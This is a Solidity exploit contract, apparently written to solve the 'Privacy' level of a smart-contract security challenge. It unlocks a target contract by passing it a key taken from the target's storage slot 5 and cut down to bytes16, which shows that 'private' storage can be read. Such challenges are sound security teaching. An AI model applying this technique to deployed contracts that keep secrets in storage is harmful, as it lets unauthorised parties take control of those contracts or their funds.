// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function locked() external view returns (bool);
    function unlock(bytes16 _key) external;
}

/**
 * @title PrivacyExploit
 * @dev Exploit contract to solve the Privacy challenge (level 12)
 * This contract demonstrates how to access "private" variables in a contract's storage
 */
contract PrivacyExploit {
    address public owner;
    address public privacyAddress;
    
    constructor(address _privacyAddress) {
        owner = msg.sender;
        privacyAddress = _privacyAddress;
    }
    
    /**
     * @dev Unlocks the Privacy contract by extracting the key from its storage
     * @param storageData The bytes32 value stored at the contract's storage slot 5 (data[2])
     */
    function unlockPrivacy(bytes32 storageData) external {
        require(msg.sender == owner, "Only owner can call this function");
        
        // Convert bytes32 to bytes16 as required by the unlock function
        bytes16 key = bytes16(storageData);
        
        // Call the unlock function with the extracted key
        IPrivacy(privacyAddress).unlock(key);
        
        // Verify the contract is unlocked
        bool isLocked = IPrivacy(privacyAddress).locked();
        require(!isLocked, "Failed to unlock the contract");
    }
    
    /**
     * @dev Checks if the Privacy contract is locked
     * @return bool True if locked, false otherwise
     */
    function checkLocked() external view returns (bool) {
        return IPrivacy(privacyAddress).locked();
    }
}
